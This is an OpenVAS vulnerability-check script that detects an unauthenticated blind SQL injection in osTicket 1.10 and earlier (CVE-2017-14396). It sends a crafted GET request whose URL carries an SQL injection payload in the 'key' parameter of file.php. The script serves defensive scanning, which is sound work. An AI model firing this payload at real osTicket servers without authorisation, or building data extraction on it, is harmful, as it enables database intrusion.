##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_os_ticket_sql_inj_vuln.nasl 11982 2018-10-19 08:49:21Z mmartin $
#
# osTicket SQL Injection Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:osticket:osticket";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140374");
  script_version("$Revision: 11982 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 10:49:21 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-09-18 16:34:35 +0700 (Mon, 18 Sep 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2017-14396");

  script_tag(name:"qod_type", value:"remote_analysis"); # Blind SQL Injection

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("osTicket SQL Injection Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("osticket_detect.nasl");
  script_mandatory_keys("osticket/installed");

  script_tag(name:"summary", value:"osTicket is prone to an unauthenticated SQL injection vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"By constructing an array via use of square brackets at the end of a
parameter name it is possible to inject SQL commands.");

  script_tag(name:"affected", value:"osTicket version 1.10 and prior.");

  script_tag(name:"solution", value:"Update to version 1.10.1 or later.");

  script_xref(name:"URL", value:"http://osticket.com/blog/125");
  script_xref(name:"URL", value:"https://pentest.blog/advisory-osticket-v1-10-unauthenticated-sql-injection/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir =="/")
  dir = "";

# blind SQL injection
url = dir + '/file.php?key%5Bid%60%3D1%20AND%202735%3D2735%23]=1&signature=1&expires=15104725311';

if (http_vuln_check(port: port, url: url, pattern: "Status: 422 Unprocessable Entity")) {
  report = "The response indicates that a blind SQL injection is possible.\n\nRequest URL: " +
           report_vuln_url(port: port, url: url, url_only: TRUE);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
